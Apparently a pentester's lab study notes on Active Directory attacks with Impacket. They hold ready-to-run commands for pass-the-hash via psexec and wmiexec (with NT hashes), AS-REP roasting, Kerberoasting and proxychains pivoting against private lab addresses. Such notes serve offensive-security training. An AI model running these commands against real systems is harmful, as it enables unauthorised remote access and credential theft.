# Attacks
- [[MySQL]]
- [[AS-REP Roasting]]
- [[Kerberoasting]]
- [[Domain Controller Synchronization]]
- [[Pass the Hash]]
- [[Shadow Copies]]
- [[Assembling the Pieces]]


- #### Cracking NTLM [[Impacket]]
- psexec.py
- wmiexec.py
- Using psexec.py
	- searches for a writable share and uploads an executable file to it. Then registers exe as Windows service & starts
- Using impacket-scripts to execute psexec.py
		- user friendly
		- upload .exe
		- leaves logs
	- impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
		- -hashes = hash
			- format = "LMHash:NTHash"
			- since we only use NTLM hash
				- fill LMHash section with (32) 0's
			- then username@ip
			- then command to execute
				- default or blank = cmd.exe
		- shell is always a SYSTEM user
- impacket-wmiexec
	- doesnt write to disk
	- can be used with pth-wmis for remote acces
	- ```
		impacket-wmiexec -hashes 00000000000000000000000000000000: 2a944a58d4ffa77137b2c587e6ed7626 maria@192.168.210.70
		``
#### Set up SMB relay server
- [[Responder]]

### AS-REP Roasting
- `impacket-GetNPUsers -dc-ip 192.168.200.70 -request -outputfile hashes.asreproast corp.com/pete`
#### Kerberoasting
- `sudo impacket-GetUserSPNs -request -dc-ip 192.168.200.70 corp.com/kevin`
### Pivoting
- `proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.6.240`
- `whoami;hostname;ipconfig`
